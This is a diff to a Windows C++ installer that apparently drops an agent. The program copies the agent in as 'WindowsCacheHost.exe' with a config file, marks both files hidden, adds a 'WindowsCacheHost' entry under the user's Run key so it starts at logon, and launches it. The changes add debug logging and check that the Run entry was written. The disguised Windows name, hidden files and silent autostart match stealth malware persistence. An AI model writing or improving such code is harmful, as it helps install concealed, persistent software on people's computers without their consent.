@@ -42,6 +42,22 @@ static std::wstring Join(const std::wstring& a, const std::wstring& b) {
     return out;
 }
 
+static std::string ToUtf8(const std::wstring& value) {
+    if (value.empty()) return {};
+    int size = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), (int)value.size(), nullptr, 0, nullptr, nullptr);
+    if (size <= 0) return {};
+    std::string out((size_t)size, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, value.c_str(), (int)value.size(), out.data(), size, nullptr, nullptr);
+    return out;
+}
+
+static void LogSetup(const std::wstring& directory, const std::wstring& message) {
+    std::string line = ToUtf8(message) + "\r\n";
+    std::ofstream out(directory + L"\\setup.log", std::ios::binary | std::ios::app);
+    if (!out.good()) return;
+    out.write(line.data(), (std::streamsize)line.size());
+}
+
 static bool Copy(const std::wstring& from, const std::wstring& to) {
     return CopyFileW(from.c_str(), to.c_str(), FALSE) != FALSE;
 }
@@ -100,15 +116,28 @@ static int RunHidden(const std::wstring& exe, const std::wstring& args, DWORD ti
     return (int)code;
 }
 
-static bool CreateLogonTask(const std::wstring& exe) {
+static bool CreateLogonTask(const std::wstring& exe, const std::wstring& logDirectory) {
     HKEY key = nullptr;
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0, nullptr, 0, KEY_SET_VALUE, nullptr, &key, nullptr) != ERROR_SUCCESS) return false;
+    LONG opened = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, nullptr, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, nullptr, &key, nullptr);
+    if (opened != ERROR_SUCCESS) {
+        LogSetup(logDirectory, L"run_key_open failed error=" + std::to_wstring(opened));
+        return false;
+    }
     std::wstring value = L"\"" + exe + L"\" --installed";
     LONG result = RegSetValueExW(key, L"WindowsCacheHost", 0, REG_SZ,
         reinterpret_cast<const BYTE*>(value.c_str()), (DWORD)((value.size() + 1) * sizeof(wchar_t)));
     RegCloseKey(key);
-    return result == ERROR_SUCCESS;
+    LogSetup(logDirectory, L"run_key_set " + std::to_wstring(result));
+    if (result != ERROR_SUCCESS) return false;
+
+    wchar_t readBack[1024]{};
+    DWORD size = sizeof(readBack);
+    DWORD type = 0;
+    LONG read = RegGetValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        L"WindowsCacheHost", RRF_RT_REG_SZ, &type, readBack, &size);
+    LogSetup(logDirectory, L"run_key_read " + std::to_wstring(read));
+    return read == ERROR_SUCCESS;
 }
 
 static bool StartAgent(const std::wstring& exe, const std::wstring& workingDir) {
@@ -144,13 +173,19 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
     std::wstring agentTarget = Join(targetDir, L"WindowsCacheHost.exe");
     std::wstring configTarget = Join(targetDir, L"klive.config.json");
 
-    if (!Copy(agentSource, agentTarget) || !Copy(configSource, configTarget))
+    LogSetup(targetDir, L"setup start agentSource=" + agentSource);
+    if (!Copy(agentSource, agentTarget) || !Copy(configSource, configTarget)) {
+        LogSetup(targetDir, L"copy failed error=" + std::to_wstring(GetLastError()));
         return 1;
+    }
+    LogSetup(targetDir, L"copy ok");
 
     SetFileAttributesW(agentTarget.c_str(), FILE_ATTRIBUTE_HIDDEN);
     SetFileAttributesW(configTarget.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
-    CreateLogonTask(agentTarget);
-    return StartAgent(agentTarget, targetDir) ? 0 : 1;
+    CreateLogonTask(agentTarget, targetDir);
+    bool started = StartAgent(agentTarget, targetDir);
+    LogSetup(targetDir, L"start_agent " + std::to_wstring(started ? 1 : 0) + L" error=" + std::to_wstring(started ? 0 : GetLastError()));
+    return started ? 0 : 1;
 }
 
